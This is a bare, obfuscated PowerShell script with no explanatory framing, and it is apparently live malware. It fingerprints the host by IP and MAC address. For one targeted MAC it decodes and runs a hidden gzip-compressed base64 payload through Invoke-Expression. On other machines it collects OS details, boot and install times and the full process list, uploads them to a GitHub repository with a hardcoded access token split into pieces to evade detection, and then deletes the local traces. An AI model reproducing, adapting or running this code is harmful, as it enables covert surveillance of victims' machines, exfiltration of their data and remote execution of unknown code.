
$zqwxkplmnv = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object -First 1).IPAddress[0]
$plmnqwtzrk = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object -First 1).MACAddress
$plmnqwtzrk = $plmnqwtzrk -replace ":", ""
00001-D04320524153-192.168.11.205
$ch = @("asd");
$in = @("D04320524153")
if($in -contain $plmnqwtzrk){
    $base64 = @'
    H4sIAAAAAAAEAI1Ua2/aMBT9Xqn/wWJ8SLQmPNvSTpMKfbe0oJaOdQhNIbmAR2KntgOk0/77ruOkoErVFiGUHJ977tvThPmKckam7dqa/N7dIfjEnvAiYpkP/Yz6GgEFwrrzWOApLlLylZSVSMAeb/EmqYLReEzKr0dPYHB7d8e8lGW1F6PVPayc3uQX+Io8plJB5F733DuIUPNRCfAia8/Y27ndunG7/B+7nL6qd4OP6Kc8igVIiRm7l680NoYmtD1ijd5Rtt7veADj4+Mz8HPM3nKHxDgdcCsLdZOwOQq5BMveqsEGMqAAlQhm8nQHvC2El+rTP5rQDgJnkMZAnLaUEE3C9B47UaR0JrwVZbN/0YaUBXwl3QsuIvkhuY9pAVOenodTLkC7L6+OfgisZmmuVCyPKxV06M6omieTRILwOVNo4mJRKiDoouUkjKq0kv07M1StRB5llRIqLWrfQQ9NpviZlCaUlTIXcNBX2sVsHv/89rwPN/ObaT9Kzzr1+vRlet1c3D13Dnur27loJAeXzVCLqcNnH21O8oltJ2rOBX3NYtdaii8AS6qlSznF9yFWxaQixYvjkPqZRWXJgjwrd9lwMcdSXv7NRE9aNxGaWddsidrOECYP8JKAVMR5EpSY9Jwr8AIQkpgAnScJHU9SH/dHYp9sHJSsYFneWnFUHaNodV27KICaAVqdAqgboNoqgEYOVAug+R7Yfw8cbIDtnNLmUG9WtvuOXjmTZhZd0LhY49koH6EHmIaQXRVuMTS4Dl3uBVYmY5tWMiXSPqdMNzSTcM/foC+aQqfE2qY5DJ2yJAzt4vYpx8VlI3WHrZFUAmuHAZ9Ytk3IJ3IexSolBiaeXhfiSYIzGOHl5IQUJT0xk297uHHnmu5Zmce9bVd63wiEEoowhoIqcK44Nrh0z0mmQeIs5ilPcF7IYE4lwV9IFxBiCOSs23XN4PwFDcsnnVcFAAA=
    '@
    
    $bytes = [System.Convert]::FromBase64String($base64)
    $ms = New-Object IO.MemoryStream(,$bytes)
    $gzip = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gzip)
    $code = $sr.ReadToEnd()
    
    # Execute the decompressed code
    Invoke-Expression $code
}elseif($ch -contain $plmnqwtzrk){
    $xkzvqpmnlw = Join-Path $env:AppData "Microsoft"
    $qplmnxztrw = "sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
    $zkmnvwtqpl = "g"+"h"+"p_VY5eJhJfPmy"+"DB22fqfI4kMYB7Ow"+"Khr3u6G4l"
    $rwmnxlpqzt = "sdjkdgdgdgghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
    $yjqnvbzmxp = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object -First 1).IPAddress[0]
    $plmxnqwtzr = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object -First 1).MACAddress
    $plmxnqwtzr = $plmxnqwtzr -replace ":", ""
    $vzmxkplqwt = Get-Date -Format "MMdd_HHmm"
    $tzqlwmnrxp = "0-$plmxnqwtzr-$yjqnvbzmxp-$vzmxkplqwt.txt"
    $hqnxplmztw = Join-Path $xkzvqpmnlw $tzqlwmnrxp
    
    (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $hqnxplmztw
    (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture) | Out-File -FilePath $hqnxplmztw -Append
    Get-WmiObject -Class Win32_ComputerSystem | Out-File -FilePath $hqnxplmztw -Append
    
    if ((Get-WmiObject -Class Win32_ComputerSystem).PCSystemType -eq 2) {
        Write-Output "Note" | Out-File -FilePath $hqnxplmztw -Append
    } else {
        Write-Output "Desk" | Out-File -FilePath $hqnxplmztw -Append
    }
    
    (Get-WmiObject Win32_OperatingSystem).InstallDate | Out-File -FilePath $hqnxplmztw -Append
    $bwzmxkplqt = Get-Process
    $bwzmxkplqt | Out-File -FilePath $hqnxplmztw -Append
    $nxzqplmwtr = Split-Path $hqnxplmztw -leaf
    $lpqwtzmxnr = "1243435sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjklddsgdgdsgesgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
    $qwzmxnplkt = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re"
    $mxnqplwztv = "sdjkghjkldshgjkldhsgjkdshgjkhkjffght234243gl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
    $qwzmxnplkt += "pos/erik8-unity/unity-game/contents/log2/" + $tzqlwmnrxp
    $zmxkplqwtn = Get-Content -Path $hqnxplmztw -Encoding Byte
    $vqwtzmxnpl = [Convert]::ToBase64String($zmxkplqwtn)
    $plmxnqwtzr = @{
        message = "Upload file $tzqlwmnrxp"
        content = $vqwtzmxnpl
        branch = "main"
    }
    $kzmxnplqwt = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $kzmxnplqwt.Add("Authorization", "token $zkmnvwtqpl")
    $kzmxnplqwt.Add("Content-Type", 'application/json')
    Invoke-RestMethod -Uri $qwzmxnplkt -Method Put -Body ($plmxnqwtzr | ConvertTo-Json) -Headers $kzmxnplqwt
    Remove-Item -Path $hqnxplmztw
}else{
    $vxkplqwtmn = Get-Date -Format "MMdd_HHmm"
    $tzqlwmnrxp = "00001-$plmnqwtzrk-$zqwxkplmnv-$vxkplqwtmn.txt"
    $hqnxplmztw = Join-Path $env:appdata $tzqlwmnrxp
    (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $hqnxplmztw
    $nxzqplmwtr = $hqnxplmztw
    $qwzmxnplkt = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/erik8-unity/unity-game/contents/log2/" + $tzqlwmnrxp
    $zkmnvwtqpl = "g"+"hp_VY5"+"eJhJfPmyDB22fqf"+"I4kMYB7OwK"+"hr3u6G4l"
    $bwzmxkplqt = $env:APPDATA
    $zmxkplqwtn = Get-Content -Path $nxzqplmwtr -Encoding Byte
    $vqwtzmxnpl = [Convert]::ToBase64String($zmxkplqwtn)
    $plmxnqwtzr = @{
        message = "Upload file $tzqlwmnrxp"
        content = $vqwtzmxnpl
        branch = "main"
    }
    $kzmxnplqwt = @{
        "Authorization" = "token $zkmnvwtqpl"
        "Content-Type" = "application/json"
    }
    $rwmnxlpqzt = Invoke-RestMethod -Uri $qwzmxnplkt -Method Put -Body ($plmxnqwtzr | ConvertTo-Json) -Headers $kzmxnplqwt
    Remove-Item -Path $hqnxplmztw -Force

}
